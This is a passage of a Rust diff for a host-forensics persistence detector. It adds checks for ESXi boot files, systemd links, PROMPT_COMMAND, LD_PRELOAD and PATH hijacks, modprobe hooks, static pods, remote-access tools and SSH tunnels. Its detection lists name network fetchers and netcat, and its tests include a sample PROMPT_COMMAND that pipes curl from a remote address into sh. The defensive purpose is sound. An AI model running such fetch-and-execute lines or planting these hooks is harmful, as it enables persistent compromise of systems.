+    if command.is_empty() || text(record, "action") == "initdefault" {
+        return None;
+    }
+    let program = command
+        .split_whitespace()
+        .find(|w| !matches!(*w, "exec" | "nohup" | "nice") && !w.contains('=') && !w.starts_with('-'))?;
+    let program = program.trim_start_matches(['"', '\'']);
+    let system = ["/etc/", "/usr/", "/sbin/", "/bin/", "/opt/", "/lib/", "/var/opt/"];
+    (program.starts_with('/') && !system.iter().any(|d| program.starts_with(d)))
+        .then(|| format!("{} ({}): {command}", text(record, "id"), text(record, "action")))
+}
+
+/// What a stock ESXi image keeps in `etc/rc.local.d`; /etc/rc.local runs every other executable
+/// file in the folder at boot.
+fn esxi_rc_local_file(r: &Value) -> Option<String> {
+    let path = text(r, "source_path");
+    let stock = path == "etc/rc.local.d/local.sh"
+        || path == "etc/rc.local.d/kickstart.py"
+        || path == "etc/rc.local.d/cleanupStatefulHost.py"
+        || path.starts_with("etc/rc.local.d/autodeploy/");
+    let mode = u32::from_str_radix(text(r, "mode"), 8).unwrap_or(0);
+    // A mode of 0 means the collection did not record one: the file may run.
+    let runs = mode == 0 || mode & 0o111 != 0;
+    (!stock && runs && !path.rsplit('/').next().unwrap_or_default().starts_with('.'))
+        .then(|| format!("{path} runs at boot (mode {mode:o})"))
+}
+
+fn esxi_community(r: &Value) -> Option<String> {
+    let level = text(r, "acceptance_level");
+    ["community", "CommunitySupported"]
+        .contains(&level)
+        .then(|| format!("{} {} ({level})", text(r, "name"), text(r, "version")))
+}
+
+fn esxi_vib_startup(r: &Value) -> Option<String> {
+    let files = r["files"].as_array()?;
+    let starts = ["etc/init.d/", "etc/rc.local.d/", "var/spool/cron/", "etc/cron"];
+    let hit = files
+        .iter()
+        .filter_map(Value::as_str)
+        .find(|f| starts.iter().any(|p| f.trim_start_matches('/').starts_with(p)))?;
+    Some(format!("{} installs {hit}", text(r, "name")))
+}
+
+fn esxi_admin(r: &Value) -> Option<String> {
+    let user = text(r, "user");
+    let group = r["is_group"] == true;
+    let default = !group && ["root", "dcui", "vpxuser"].contains(&user);
+    // -1 is the built-in Administrator role.
+    (r["role_id"] == -1 && !default && !user.is_empty()).then(|| {
+        format!("{} {user} is an administrator of {}", if group { "group" } else { "account" }, text(r, "entity"))
+    })
+}
 
 /// A string field of a record; empty when the field is missing or not text.
 pub fn text<'a>(record: &'a Value, field: &str) -> &'a str {
@@ -314,32 +1309,291 @@ fn script_writable(record: &Value) -> Option<String> {
     (!why.is_empty()).then(|| format!("{} (mode {mode:o})", why.join(", ")))
 }
 
+const SYSTEMD_EXEC: [&str; 5] = ["exec_start", "exec_start_pre", "exec_start_post", "exec_stop", "exec_reload"];
+
 fn systemd_exec(record: &Value) -> Option<String> {
-    ["exec_start", "exec_start_pre", "exec_start_post", "exec_stop", "exec_reload"]
+    SYSTEMD_EXEC
         .iter()
-        .find_map(|field| susp(record, field).map(|detail| format!("{field} {detail}")))
+        .find_map(|field| susp(record, field).map(|detail| format!("{field} {detail}{}", unit_state(record))))
+}
+
+/// What the first pass knew about the unit: ` [enabled: wanted by multi-user.target]`,
+/// ` [masked]`, ` [not enabled]`, or nothing when no enablement link was collected.
+fn unit_state(record: &Value) -> String {
+    let joined = &record["joined"];
+    match joined["enablement"].as_str() {
+        Some("enabled") => {
+            let by: Vec<&str> =
+                joined["enabled_by"].as_array().into_iter().flatten().filter_map(Value::as_str).collect();
+            let lingers = if joined["owner_lingers"].is_string() { "; owner lingers" } else { "" };
+            format!(" [enabled: {}{lingers}]", by.join(", "))
+        }
+        Some("masked") => " [masked]".to_string(),
+        Some("not-enabled") => " [not enabled]".to_string(),
+        _ => String::new(),
+    }
+}
+
+/// A timer, socket or path unit (`kind`) whose service runs a suspicious command: the detail
+/// names the service and the command it starts.
+fn activated_exec(record: &Value, kind: &str) -> Option<String> {
+    if text(record, "unit_type") != kind {
+        return None;
+    }
+    let starts = &record["joined"]["starts"];
+    let detail = systemd_exec(starts)?;
+    Some(format!("{kind} -> {}{}: {detail}", text(starts, "unit"), unit_state(record)))
+}
+
+/// A wants/requires/alias link whose target is not in a unit directory. Targets are text and
+/// are resolved lexically against the link's own directory, never on a file system.
+fn enablement_outside_unit_dirs(record: &Value) -> Option<String> {
+    if !["wants", "requires", "upholds", "link"].contains(&text(record, "kind")) {
+        return None;
+    }
+    let (target, path) = (text(record, "target"), text(record, "source_path"));
+    let mut parts: Vec<&str> = Vec::new();
+    if !target.starts_with('/') {
+        parts.extend(path.rsplit_once('/').map_or("", |(dir, _)| dir).split('/'));
+    }
+    let mut escapes = false;
+    for part in target.split('/') {
+        match part {
+            "" | "." => {}
+            // More `..` than directories: it points out of the host root.
+            ".." => escapes |= parts.pop().is_none(),
+            part => parts.push(part),
+        }
+    }
+    let resolved = parts.join("/");
+    let unit_dirs = ["etc/systemd/", "usr/lib/systemd/", "lib/systemd/", "usr/local/lib/systemd/", "run/systemd/"];
+    let user_dirs = [".config/systemd/user/", ".local/share/systemd/user/"];
+    let usual = !escapes
+        && (unit_dirs.iter().any(|d| resolved.starts_with(d))
+            || (text(record, "scope") == "user" && user_dirs.iter().any(|d| resolved.contains(d))));
+    (!target.is_empty() && !usual).then(|| format!("{} links to {target}", text(record, "unit")))
 }
 
 fn shell_profile(record: &Value) -> Option<String> {
     let line = text(record, "text");
-    if line.trim_start().starts_with('#') {
+    // `/etc/environment` holds `NAME=value` pairs, not shell code: `environment-*` checks read it.
+    if line.trim_start().starts_with('#') || text(record, "source_path") == "etc/environment" {
+        return None;
+    }
+    // OpenBSD's stock `etc/ksh.kshrc` aliases `su` to its xterm-title wrapper.
+    if text(record, "source_path") == "etc/ksh.kshrc" && line.trim() == "alias su=wsu" {
         return None;
     }
     susp(record, "text").or_else(|| {
-        ["LD_PRELOAD=", "PROMPT_COMMAND=", "alias sudo=", "alias su="]
+        ["LD_PRELOAD=", "alias sudo=", "alias su="]
             .iter()
             .find(|needle| line.contains(**needle))
             .map(|needle| format!("sets {needle}: {line}"))
+            .or_else(|| prompt_command_runs_code(line).then(|| format!("sets PROMPT_COMMAND=: {line}")))
     })
+}
+
+/// A word of shell: its text with the quotes removed, and the rest of the input after it. The
+/// word ends at an unquoted blank, `;`, `&`, `|` or `)`.
+fn shell_word(input: &str) -> (String, &str) {
+    let (mut word, mut quote) = (String::new(), None);
+    let mut chars = input.char_indices();
+    while let Some((i, c)) = chars.next() {
+        match (quote, c) {
+            (None, '"' | '\'') => quote = Some(c),
+            (Some(q), c) if c == q => quote = None,
+            (Some('"'), '\\') => {
+                word.push(c);
+                if let Some((_, next)) = chars.next() {
+                    word.push(next);
+                }
+            }
+            (None, c) if c.is_whitespace() || [';', '&', '|', ')'].contains(&c) => return (word, &input[i..]),
+            (_, c) => word.push(c),
+        }
+    }
+    (word, "")
+}
+
+/// True when a `PROMPT_COMMAND` assignment in `line` sets something that runs code the way
+/// an attacker would use it. A value is ordinary when every statement of it only prints a
+/// prompt or title (`printf`, `echo`, without redirection or substitution), assigns a variable, expands the previous value, or is one of the three scripts and the one
+/// function that distributions name (`/etc/sysconfig/bash-prompt-*`, `__vte_prompt_command`).
+/// The assigned text is read the way the shell reads it, so a title built from quoted pieces
+/// is one value. Anything else (a program, a path, `$(...)`) is reported.
+fn prompt_command_runs_code(line: &str) -> bool {
+    line.match_indices("PROMPT_COMMAND").any(|(at, _)| {
+        let before = &line[..at];
+        let after = &line[at + "PROMPT_COMMAND".len()..];
+        let assigned = after.strip_prefix("+=").or_else(|| after.strip_prefix('='));
+        let (Some(value), false) = (assigned, before.ends_with(|c: char| c.is_ascii_alphanumeric() || c == '_')) else {
+            return false;
+        };
+        // `PROMPT_COMMAND=(a b)` and `+=(a)` are arrays: every element is a command.
+        let Some(mut elements) = value.strip_prefix('(') else {
+            return !ordinary_prompt_value(&shell_word(value).0);
+        };
+        loop {
+            elements = elements.trim_start();
+            if elements.is_empty() || elements.starts_with(')') {
+                return false;
+            }
+            let (element, rest) = shell_word(elements);
+            // A word that stops at once (a stray `;` or `&`) is not an element: report the line
+            // rather than loop on it.
+            if rest.len() == elements.len() || !ordinary_prompt_value(&element) {
+                return true;
+            }
+            elements = rest;
+        }
+    })
+}
+
+fn ordinary_prompt_value(value: &str) -> bool {
+    if value.contains(['`', '<', '>']) || value.contains("$(") {
+        return false;
+    }
+    // `()` clears the array; an empty value unsets the variable.
+    if value.is_empty() || value == "()" {
+        return true;
+    }
+    split_statements(value).iter().all(|statement| {
+        let (word, rest) = shell_word(statement);
+        let (word, rest) = if word.is_empty() { (String::new(), "") } else { (word, rest) };
+        match word.as_str() {
+            "printf"
+            | "echo"
+            | "true"
+            | ":"
+            | "$PROMPT_COMMAND"
+            | "${PROMPT_COMMAND}"
+            | "__vte_prompt_command"
+            | "/etc/sysconfig/bash-prompt-xterm"
+            | "/etc/sysconfig/bash-prompt-screen"
+            | "/etc/sysconfig/bash-prompt-default" => true,
+            // `NAME=value` only assigns; the value was checked for substitution above.
+            w => is_assignment(w) && rest.trim().is_empty(),
+        }
+    })
+}
+
+/// The statements of a shell string: split at `;`, `&`, `|` and newlines that are not quoted.
+fn split_statements(text: &str) -> Vec<&str> {
+    let (mut out, mut quote, mut start) = (Vec::new(), None, 0);
+    let mut chars = text.char_indices();
+    while let Some((i, c)) = chars.next() {
+        match (quote, c) {
+            (None, '"' | '\'') => quote = Some(c),
+            (Some(q), c) if c == q => quote = None,
+            (Some('"'), '\\') | (None, '\\') => {
+                chars.next();
+            }
+            (None, ';' | '&' | '|' | '\n') => {
+                out.push(text[start..i].trim());
+                start = i + 1;
+            }
+            _ => {}
+        }
+    }
+    out.push(text[start..].trim());
+    out.retain(|s| !s.is_empty());
+    out
+}
+
+/// What a variable assignment in `/etc/environment`, `pam_env.conf` or `environment.d` sets:
+/// `NAME=value`, `export NAME=value`, or pam_env's `NAME DEFAULT=value OVERRIDE=value`.
+fn env_assignment(line: &str) -> Option<(String, Vec<String>)> {
+    let line = line.trim().strip_prefix("export ").unwrap_or(line.trim());
+    let unquote = |v: &str| v.trim().trim_matches(['"', '\'']).to_string();
+    if let Some((name, value)) = line.split_once('=').filter(|(n, _)| !n.contains(char::is_whitespace)) {
+        return Some((name.to_string(), vec![unquote(value)]));
+    }
+    let (name, rest) = line.split_once(char::is_whitespace)?;
+    let values: Vec<String> = rest
+        .split_whitespace()
+        .filter_map(|w| w.strip_prefix("DEFAULT=").or_else(|| w.strip_prefix("OVERRIDE=")))
+        .map(unquote)
+        .collect();
+    (!values.is_empty()).then(|| (name.to_string(), values))
+}
+
+/// `LD_PRELOAD` or `LD_AUDIT` set to anything, or `LD_LIBRARY_PATH` with a directory an
+/// unprivileged user can write to.
+fn env_library_hijack(line: &str) -> Option<String> {
+    let (name, values) = env_assignment(line)?;
+    let hit = match name.as_str() {
+        "LD_PRELOAD" | "LD_AUDIT" => values.iter().any(|v| !v.is_empty()),
+        "LD_LIBRARY_PATH" => values.iter().flat_map(|v| v.split(':')).any(starts_with_temp),
+        _ => false,
+    };
+    hit.then(|| format!("sets {name}={}", values.join(" ")))
+}
+
+/// A `PATH` entry that is empty or `.` (the current directory), temporary, or hidden.
+fn env_path_hijack(line: &str) -> Option<String> {
+    let (name, values) = env_assignment(line)?;
+    if name != "PATH" {
+        return None;
+    }
+    let risky = |dir: &str| {
+        let hidden = dir.split('/').any(|part| {
+            let name = part.strip_prefix('.').unwrap_or("");
+            name.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') && !BENIGN_HIDDEN.contains(&name)
+        });
+        dir == "." || starts_with_temp(dir) || hidden
+    };
+    // A leading or doubled `:` is an empty entry, which means the current directory.
+    let empty = |v: &str| !v.is_empty() && (v.starts_with(':') || v.ends_with(':') || v.contains("::"));
+    values.iter().any(|v| empty(v) || v.split(':').any(risky)).then(|| format!("sets PATH={}", values.join(" ")))
+}
+
+/// The one `pam_exec` line a distribution ships: Debian 8's `pam.d/login` prints `uname`
+/// at login. Options are skipped; what runs must be exactly that command.
+fn stock_pam_exec(arguments: &str) -> bool {
+    let words: Vec<&str> = arguments.split_whitespace().collect();
+    let options = ["quiet", "stdout", "type=open_session", "type=close_session"];
+    let command: Vec<&str> = words.iter().copied().skip_while(|w| options.contains(w)).collect();
+    command == ["/bin/uname", "-snrvm"]
+}
+
+/// A modprobe `install` command made only of what distributions ship in `modprobe.d`: `modprobe`
+/// of module names (a path would load a file), `true`/`false`, `sysctl` of `net.` settings, and
+/// the `mount -t <fs>` of `rpc_pipefs`, `nfsd` and `binfmt_misc` below `/proc` or `/var/lib/nfs`.
+fn stock_modprobe_command(args: &str) -> bool {
+    // Brace groups as words (`${VAR}` is not one), and the one redirection shipped: output to /dev/null.
+    let words: Vec<&str> =
+        args.split_whitespace().map(|w| if w == "{" || w == "}" || w == "};" { ";" } else { w }).collect();
+    let flat = words.join(" ").replace("> /dev/null 2>&1", "");
+    if flat.contains(['`', '<', '>', '\\']) || flat.contains("$(") {
+        return false;
+    }
+    let statements: Vec<&str> = flat.split([';', '&', '|']).map(str::trim).filter(|s| !s.is_empty()).collect();
+    let stock = |statement: &str| {
+        let words: Vec<&str> = statement.split_whitespace().collect();
+        let Some((program, args)) = words.split_first() else { return false };
+        let in_system_dir = ["/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/"].iter().any(|d| program.starts_with(d));
+        let name = if in_system_dir { program.rsplit('/').next().unwrap_or("") } else { *program };
+        match name {
+            "true" | "false" | ":" => in_system_dir || !program.contains('/'),
+            "modprobe" => in_system_dir && !args.iter().any(|a| a.contains('/')),
+            "sysctl" => {
+                in_system_dir
+                    && args.iter().all(|a| a.starts_with('-') || a.trim_matches(['\'', '"']).starts_with("net"))
+            }
+            "mount" => {
+                in_system_dir
+                    && matches!(args, ["-t", fs, _, point] if ["rpc_pipefs", "nfsd", "binfmt_misc"].contains(fs)
+                        && (point.starts_with("/proc/") || point.starts_with("/var/lib/nfs/")))
+            }
+            _ => false,
+        }
+    };
+    !statements.is_empty() && statements.iter().all(|s| stock(s))
 }
 
 fn modprobe_install(record: &Value) -> Option<String> {
     let args = text(record, "arguments").trim();
-    let chained = args.contains([';', '&', '|']);
-    let first = args.split_whitespace().next().unwrap_or("").rsplit('/').next().unwrap_or("");
-    let blocks_load = ["true", "false"].contains(&first) && !chained;
-    let defers_to_modprobe = args.starts_with("/sbin/modprobe --ignore-install") && !chained;
-    (text(record, "kind") == "install" && !args.is_empty() && !blocks_load && !defers_to_modprobe)
+    (text(record, "kind") == "install" && !args.is_empty() && !stock_modprobe_command(args))
         .then(|| format!("install {}: {args}", text(record, "module")))
 }
 
@@ -458,7 +1712,8 @@ const WRAPPERS: [&str; 13] = [
 ];
 /// Words that start a shell statement without being the command.
 const KEYWORDS: [&str; 8] = ["if", "then", "else", "elif", "do", "while", "until", "!"];
-const FETCHERS: [&str; 2] = ["curl", "wget"];
+// `fetch` is FreeBSD's downloader and `ftp -o - URL` is OpenBSD's and NetBSD's.
+const FETCHERS: [&str; 4] = ["curl", "wget", "fetch", "ftp"];
 const NETCATS: [&str; 3] = ["nc", "ncat", "netcat"];
 /// Code given to an inline interpreter that talks to the network or unpacks a payload.
 const INLINE_PAYLOAD: [&str; 8] =
@@ -636,6 +1891,13 @@ fn segments(command: &str) -> Vec<Segment> {
         }
     }
     flush(&mut current, piped, &mut out);
+    // csh `foreach name (word list)`: the list is data, and the word after `(` is not a command.
+    let mut after_foreach = false;
+    out.retain(|s| {
+        let skip = after_foreach;
+        after_foreach = s.words.first().is_some_and(|w| w == "foreach");
+        !skip
+    });
     split_shell_c(out)
 }
 
@@ -808,6 +2070,232 @@ pub fn suspicious_command(command: &str) -> Option<&'static str> {
     reasons.iter().find(|(hit, _)| *hit).map(|&(_, why)| why)
 }
 
+const CONTROL_PLANE: [&str; 4] = ["kube-apiserver", "etcd", "kube-controller-manager", "kube-scheduler"];
+/// The files k3s v1.34 writes under `server/manifests`; k3s versions differ a little.
+const K3S_STOCK: [&str; 6] =
+    ["ccm.yaml", "coredns.yaml", "local-storage.yaml", "rolebindings.yaml", "runtimes.yaml", "traefik.yaml"];
+
+fn is_static_pod(record: &Value) -> bool {
+    matches!(text(record, "source_kind"), "static-pod" | "k3s-static-pod")
+}
+
+fn static_pod_unexpected(record: &Value) -> Option<String> {
+    if !is_static_pod(record) || record["document"] != 1 {
+        return None;
+    }
+    let path = text(record, "source_path");
+    let file = path.rsplit('/').next().unwrap_or(path);
+    let stem = file.rsplit_once('.').map_or(file, |(s, _)| s);
+    // kubeadm ships these four; k3s ships no static pod at all.
+    if text(record, "source_kind") == "static-pod" && CONTROL_PLANE.contains(&stem) {
+        return None;
+    }
+    let images: Vec<&str> = record["images"].as_array().into_iter().flatten().filter_map(Value::as_str).collect();
+    Some(format!(
+        "{file}: {} {}{}",
+        text(record, "kind"),
+        text(record, "name"),
+        if images.is_empty() { String::new() } else { format!(" ({})", images.join(", ")) }
+    ))
+}
+
+fn static_pod_host_access(record: &Value) -> Option<String> {
+    if !is_static_pod(record) {
+        return None;
+    }
+    let flags: Vec<&str> = [("privileged", "privileged"), ("host_pid", "hostPID"), ("host_network", "hostNetwork")]
+        .iter()
+        .filter(|(field, _)| record[*field] == true)
+        .map(|(_, label)| *label)
+        .collect();
+    let sensitive: Vec<&str> = record["host_paths"]
+        .as_array()
+        .into_iter()
+        .flatten()
+        .filter_map(Value::as_str)
+        .filter(|p| *p == "/" || ["docker.sock", "containerd.sock", "crio.sock"].iter().any(|s| p.ends_with(s)))
+        .collect();
+    (!flags.is_empty() && !sensitive.is_empty()).then(|| {
+        format!(
+            "{} ({}): {} with hostPath {}",
+            text(record, "name"),
+            text(record, "source_path"),
+            flags.join(", "),
+            sensitive.join(", ")
+        )
+    })
+}
+
+fn k3s_auto_apply_not_stock(record: &Value) -> Option<String> {
+    if text(record, "source_kind") != "k3s-auto-apply" || record["document"] != 1 {
+        return None;
+    }
+    let path = text(record, "source_path");
+    let relative = path.split_once("/server/manifests/").map_or(path, |(_, r)| r);
+    let stock = K3S_STOCK.contains(&relative) || relative.starts_with("metrics-server/");
+    (!stock).then(|| format!("{relative}: {} {}", text(record, "kind"), text(record, "name")))
+}
+
+/// The remote-access or tunnel tool a command line starts, by program name.
+fn remote_tool(command: &str) -> Option<&'static str> {
+    const TOOLS: [(&str, &str); 13] = [
+        ("anydesk", "AnyDesk"),
+        ("teamviewer", "TeamViewer"),
+        ("rustdesk", "RustDesk"),
+        ("meshagent", "MeshAgent"),
+        ("ngrok", "ngrok"),
+        ("cloudflared", "cloudflared"),
+        ("tailscaled", "Tailscale"),
+        ("zerotier-one", "ZeroTier"),
+        ("frpc", "frp client"),
+        ("frps", "frp server"),
+        ("chisel", "chisel"),
+        ("gost", "gost"),
+        ("rathole", "rathole"),
+    ];
+    let words: Vec<String> = command
+        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '"' | '\''))
+        .filter(|w| !w.is_empty())
+        .map(|w| w.rsplit('/').next().unwrap_or(w).to_ascii_lowercase())
+        .collect();
+    for (i, word) in words.iter().enumerate() {
+        if let Some((_, name)) = TOOLS.iter().find(|(program, _)| {
+            word == program || (*program == "teamviewer" || *program == "anydesk") && word.starts_with(program)
+        }) {
+            return Some(name);
+        }
+        if word == "code" && words.get(i + 1).is_some_and(|w| w == "tunnel") || word == "code-tunnel" {
+            return Some("VS Code tunnel");
+        }
+    }
+    None
+}
+
+/// An `ssh` or `autossh` command line that forwards a port (`-R`, `-L`, `-D`, `RemoteForward`,
+/// `LocalForward`, `DynamicForward`) or opens a tun device (`-w`). Only the options before the
+/// destination count: what follows it is the remote command (`ls -R`).
+fn ssh_tunnel(command: &str) -> Option<String> {
+    let words: Vec<&str> = command.split_whitespace().collect();
+    let start = words.iter().position(|w| matches!(w.rsplit('/').next(), Some("ssh" | "autossh")))?;
+    // `echo ssh -R`, `man ssh`, `grep ssh`: the word is data, not the program.
+    if words.iter().take(start).any(|w| matches!(*w, "echo" | "printf" | "man" | "grep" | "which" | "type")) {
+        return None;
+    }
+    // ssh(1) options that take a value; autossh adds `-M <port>`.
+    let with_value = if words.get(start).is_some_and(|w| w.ends_with("autossh")) {
+        "bcDEeFIiJLlMmOopQRSWw"
+    } else {
+        "bcDEeFIiJLlmOopQRSWw"
+    };
+    let mut i = start + 1;
+    while let Some(word) = words.get(i) {
+        let Some(flags) = word.strip_prefix('-').filter(|f| !f.is_empty() && !f.starts_with('-')) else { break };
+        for (at, letter) in flags.char_indices() {
+            for (flag, what) in [
+                ('R', "reverse port forward (-R)"),
+                ('L', "local port forward (-L)"),
+                ('D', "SOCKS proxy (-D)"),
+                ('w', "tun device (-w)"),
+            ] {
+                if letter == flag {
+                    return Some(format!("ssh {what}"));
+                }
+            }
+            if letter == 'o' {
+                let attached = flags.get(at + 1..).filter(|v| !v.is_empty());
+                let option = attached.or_else(|| words.get(i + 1).copied()).unwrap_or_default().to_ascii_lowercase();
+                for key in ["RemoteForward", "LocalForward", "DynamicForward", "Tunnel"] {
+                    if option.starts_with(&key.to_ascii_lowercase()) {
+                        return Some(format!("ssh {key} option"));
+                    }
+                }
+            }
+            if with_value.contains(letter) {
+                // The value is the rest of this word, or the next word.
+                if at + letter.len_utf8() == flags.len() {
+                    i += 1;
+                }
+                break;
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+fn remote_tool_present(record: &Value) -> Option<String> {
+    if !matches!(text(record, "kind"), "identity" | "node" | "credentials" | "network" | "config" | "interface") {
+        return None;
+    }
+    let tool = text(record, "tool");
+    let mut parts = vec![format!("{tool} configured")];
+    for (label, field) in [("user", "user"), ("id", "id"), ("name", "name"), ("server", "server")] {
+        if !text(record, field).is_empty() {
+            parts.push(format!("{label} {}", text(record, field)));
+        }
+    }
+    Some(parts.join(", "))
+}
+
+fn tunnel_exposes_service(record: &Value) -> Option<String> {
+    if !matches!(text(record, "kind"), "tunnel" | "proxy") || text(record, "tool") == "vscode-tunnel" {
+        return None;
+    }
+    let target = text(record, "target");
+    // cloudflared's catch-all rule answers with a status code and exposes nothing.
+    if target.is_empty() || target.starts_with("http_status:") {
+        return None;
+    }
+    Some(format!(
+        "{} {} exposes {target}{}",
+        text(record, "tool"),
+        text(record, "name"),
+        if text(record, "server").is_empty() { String::new() } else { format!(" via {}", text(record, "server")) }
+    ))
+}
+
+fn vscode_tunnel_service_account(record: &Value) -> Option<String> {
+    const SERVICE: [&str; 12] = [
+        "root",
+        "www-data",
+        "nobody",
+        "daemon",
+        "git",
+        "postgres",
+        "mysql",
+        "jenkins",
+        "gitlab-runner",
+        "tomcat",
+        "nginx",
+        "apache",
+    ];
+    let user = text(record, "user");
+    (text(record, "tool") == "vscode-tunnel" && text(record, "kind") == "tunnel" && SERVICE.contains(&user))
+        .then(|| format!("tunnel {} (id {}) for {user}", text(record, "name"), text(record, "id")))
+}
+
+fn vpn_hook_suspicious(record: &Value) -> Option<String> {
+    const HOOKS: [&str; 12] = [
+        "PostUp=",
+        "PreUp=",
+        "PostDown=",
+        "PreDown=",
+        "up=",
+        "down=",
+        "route-up=",
+        "client-connect=",
+        "ipchange=",
+        "plugin=",
+        "auth-user-pass-verify=",
+        "tls-verify=",
+    ];
+    record["detail"].as_array()?.iter().filter_map(Value::as_str).find_map(|d| {
+        let hook = HOOKS.iter().find(|h| d.to_ascii_lowercase().starts_with(&h.to_ascii_lowercase()))?;
+        let command = d.get(hook.len()..)?;
+        suspicious_command(command).map(|why| format!("{hook}{command}: {why}"))
+    })
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -933,6 +2421,34 @@ mod tests {
     }
 
     #[test]
+    fn macos_login_and_legacy_checks_leave_stock_records_alone() {
+        let hook = |kind: &str, value: &str| json!({"artifact": "login-window", "kind": kind, "name": "LoginHook", "value": value});
+        assert!(check("login-hook", &hook("login_hook", "/usr/local/bin/x")).is_some());
+        assert!(check("login-hook", &hook("setting", "alice")).is_none());
+        assert!(check("login-hook-suspicious", &hook("login_hook", "/usr/local/bin/x")).is_none());
+        let relaunch =
+            |path: &str| json!({"artifact": "login-window", "kind": "relaunch_app", "path": path, "bundle_id": "x"});
+        assert!(check("relaunch-app-user-location", &relaunch("/Applications/Safari.app")).is_none());
+        assert!(check("relaunch-app-user-location", &relaunch("/Users/a/Downloads/x.app")).is_some());
+        let rule = |name: &str, class: &str| json!({"artifact": "auth-db", "name": name, "class": class});
+        assert!(check("auth-db-admin-rule-allow", &rule("system.privilege.admin", "user")).is_none());
+        assert!(check("auth-db-admin-rule-allow", &rule("system.preferences", "allow")).is_none());
+        assert!(check("auth-db-admin-rule-allow", &rule("system.privilege.admin", "allow")).is_some());
+        let rc = |path: &str| json!({"artifact": "legacy-rc", "source_path": path, "text": ". /etc/rc.common"});
+        assert!(check("legacy-rc-command", &rc("private/etc/rc.common")).is_none());
+        assert!(check("legacy-rc-command", &rc("private/etc/rc.local")).is_some());
+        let plugin = |id: &str| json!({"artifact": "system-plugins", "kind": "authorization_plugin", "bundle_id": id, "source_path": "p"});
+        assert!(check("authorization-plugin", &plugin("com.apple.x")).is_none());
+        assert!(check("authorization-plugin", &plugin("com.example.x")).is_some());
+        let spotlight =
+            json!({"artifact": "system-plugins", "kind": "spotlight_importer", "bundle_id": "com.example.x"});
+        assert!(check("authorization-plugin", &spotlight).is_none());
+        let profile = |types: Value| json!({"artifact": "config-profiles", "payload_types": types, "name": "n", "identifier": "i"});
+        assert!(check("config-profile-root-certificate", &profile(json!(["com.apple.wifi.managed"]))).is_none());
+        assert!(check("config-profile-root-certificate", &profile(json!(["com.apple.security.root"]))).is_some());
+    }
+
+    #[test]
     fn launchd_dyld_insert_and_systemd_ld_preload() {
         let job = |env: Value| json!({"artifact": "launchd", "label": "com.example.x", "environment": env});
         assert!(check("launchd-dyld-insert", &job(json!({"DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"}))).is_some());
@@ -977,5 +2493,616 @@ mod tests {
         assert!(launchd_exec(&job("user_agent"), "_agent").is_some());
         assert!(launchd_exec(&job("user_agent"), "_daemon").is_none());
         assert!(launchd_exec(&job("local_daemon"), "_daemon").is_some());
+    }
+    fn profile(line: &str) -> Value {
+        json!({"artifact": "shell-profiles", "source_path": "etc/bashrc", "text": line})
+    }
+
+    #[test]
+    fn stock_prompt_commands_are_not_flagged_but_code_is() {
+        let stock = [
+            r#"PROMPT_COMMAND=/etc/sysconfig/bash-prompt-xterm"#,
+            r#"[ -e /etc/sysconfig/bash-prompt-default ] && PROMPT_COMMAND=/etc/sysconfig/bash-prompt-default"#,
+            r#"PROMPT_COMMAND='printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/\~}"'"#,
+            r#"PROMPT_COMMAND='printf "\033k%s@%s:%s\033\\" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/\~}"'"#,
+            r#"PROMPT_COMMAND="__vte_prompt_command""#,
+            r#"PROMPT_COMMAND='echo -ne "\033]0;'${i}'\007"'"#,
+            r#"[ "$NEWLINE_BEFORE_PROMPT" = yes ] && PROMPT_COMMAND="PROMPT_COMMAND=echo""#,
+            r#"eval 'PROMPT_COMMAND=()'"#,
+            r#"PROMPT_COMMAND+=('printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD}"')"#,
+            r#"PROMPT_COMMAND=$PROMPT_COMMAND"#,
+        ];
+        for line in stock {
+            assert_eq!(check("shell-profile-suspicious", &profile(line)), None, "{line}");
+        }
+        let bad = [
+            "PROMPT_COMMAND='/usr/local/bin/logger-hook'",
+            "PROMPT_COMMAND=/etc/sysconfig/bash-prompt-evil",
+            "PROMPT_COMMAND='printf x >> ~/.cache/log'",
+            "PROMPT_COMMAND='printf \"$(id)\"'",
+            "PROMPT_COMMAND='history -a'",
+            "PROMPT_COMMAND=\"history -a; $PROMPT_COMMAND\"",
+            "PROMPT_COMMAND='printf hi; /usr/local/bin/x'",
+            "PROMPT_COMMAND+=('/opt/agent')",
+            "PROMPT_COMMAND=\"echo hi && /opt/agent\"",
+            "export PROMPT_COMMAND=\"curl http://203.0.113.5/x | sh\"",
+            "PROMPT_COMMAND=`id`",
+        ];
+        for line in bad {
+            assert!(check("shell-profile-suspicious", &profile(line)).is_some(), "{line}");
+        }
+        // A name that merely ends in the variable's name is another variable.
+        assert_eq!(check("shell-profile-suspicious", &profile("MY_PROMPT_COMMAND=/opt/x")), None);
+    }
+
+    #[test]
+    fn csh_foreach_list_is_data() {
+        let line = r#"foreach file ("$HOME/.i18n" /etc/locale.conf /etc/sysconfig/i18n)"#;
+        let record = json!({"artifact": "shell-profiles", "source_path": "etc/profile.d/lang.csh", "text": line});
+        assert_eq!(check("shell-profile-suspicious", &record), None);
+        let bad =
+            json!({"artifact": "shell-profiles", "source_path": "etc/profile.d/x.csh", "text": "/home/x/.hidden/run"});
+        assert!(check("shell-profile-suspicious", &bad).is_some());
+    }
+
+    #[test]
+    fn stock_modprobe_install_lines_are_not_flagged_but_planted_ones_are() {
+        let rec = |args: &str| json!({"artifact": "modules-load", "kind": "install", "module": "m", "arguments": args});
+        let stock = [
+            "/bin/true",
+            "/bin/false",
+            "/sbin/modprobe --ignore-install bridge && /sbin/sysctl -q -w net.bridge.bridge-nf-call-arptables=0",
+            "/sbin/modprobe --first-time --ignore-install binfmt_misc && { /bin/mount -t binfmt_misc none /proc/sys/fs/binfmt_misc > /dev/null 2>&1 || :; }",
+            "/sbin/modprobe --first-time --ignore-install sunrpc && { /bin/mount -t rpc_pipefs sunrpc /var/lib/nfs/rpc_pipefs > /dev/null 2>&1 || :; }",
+            "/sbin/modprobe ehci_hcd ; /sbin/modprobe -i uhci_hcd ; true",
+            "/sbin/modprobe -o dummy1 --ignore-install dummy",
